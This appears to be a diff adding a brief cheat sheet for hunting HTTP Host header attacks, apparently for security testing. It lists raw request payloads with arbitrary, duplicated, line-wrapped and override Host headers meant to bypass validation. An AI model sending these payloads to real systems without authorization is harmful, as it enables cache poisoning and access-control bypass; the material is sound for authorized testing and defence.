@@ -1,0 +1,45 @@
+Hunting for HTTP Host Header Attacks :
+
+1-Supply an arbitrary Host header
+- Original Request
+GET / HTTP/1.1
+Host: example.com
+- Modified Request
+GET / HTTP/1.1
+Host: 1yz02.com
+
+2-Check for flawed validation
+- Allows the addition of a port.
+GET / HTTP/1.1
+Host: example:bad-stuff-here
+
+-Flawed validation to allow subdomain
+GET / HTTP/1.1
+Host: example.com
+GET / HTTP/1.1
+Host: hacked-subdomain.example.com
+
+3-Send ambiguous requests
+- Inject duplicate Host headers
+GET / HTTP/1.1
+Host: example.com
+Host: 1yz02.com
+
+-Supply an absolute URL.
+GET https://example.com./ HTTP/1.1
+Host: 1yz02.com
+
+- Add a line wrapping.
+- GET / HTTP/1.1
+  Host: 1yz02.com
+Host: example.com
+
+4-Inject host override headers :
+▪ X-Forwarded-Host
+▪ X-Host
+▪ X-Forwarded-Server
+▪ X-HTTP-Host-Override
+▪ Forwarded
+GET / HTTP/1.1
+Host: example.com
+X-Forwarded-Host: 1yz02.com
